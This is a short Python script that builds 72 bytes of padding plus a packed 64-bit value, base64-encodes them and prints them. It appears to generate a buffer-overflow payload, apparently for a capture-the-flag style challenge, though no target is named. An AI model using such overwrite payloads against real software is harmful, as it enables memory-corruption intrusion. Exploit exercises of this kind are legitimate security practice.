
import sys
import struct
import base64

buf = b'oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo'
buf += struct.pack('<Q', 2000262844198158749)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
